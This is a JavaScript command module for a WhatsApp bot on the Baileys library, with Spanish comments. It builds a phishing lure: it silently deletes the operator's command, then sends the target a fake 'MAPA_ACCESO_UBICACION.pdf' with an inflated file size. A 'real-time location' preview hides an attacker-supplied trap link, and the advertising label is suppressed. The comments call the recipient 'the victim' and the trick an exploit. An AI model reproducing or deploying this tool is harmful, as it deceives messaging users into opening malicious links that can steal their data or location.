export default {
    name: 'documento_trampa',
    match: (text) => /^\.file/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const linkTrampa = textoLimpio.replace(/^\.file\s*/i, '').trim() || "https://tu-link.com";

        try {
            // Sigilo
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // EXPLOIT: Usamos el contenedor de documento para evitar la URL gris
            await sock.sendMessage(remitente, {
                document: { url: 'https://raw.githubusercontent.com/filipe-ps/Baileys/master/README.md' }, // Un archivo ligero cualquiera
                mimetype: 'application/pdf',
                fileName: 'MAPA_ACCESO_UBICACION.pdf', // Nombre que verá la víctima
                fileLength: 999999999, // Tamaño falso para que parezca pesado/importante
                caption: 'Haz clic para abrir el mapa detallado.',
                contextInfo: {
                    externalAdReply: {
                        title: '📍 UBICACIÓN EN TIEMPO REAL',
                        body: 'Pulsa para ver la ruta en el mapa',
                        mediaType: 1,
                        thumbnail: Buffer.alloc(0), // Aquí podrías poner un mapa real en base64
                        sourceUrl: linkTrampa, // El link trampa real
                        renderLargerThumbnail: true,
                        showAdAttribution: false // Evita que aparezca la etiqueta de "Publicidad"
                    }
                }
            });

        } catch (err) {
            console.error("Error File Trap:", err);
        }
    }
};
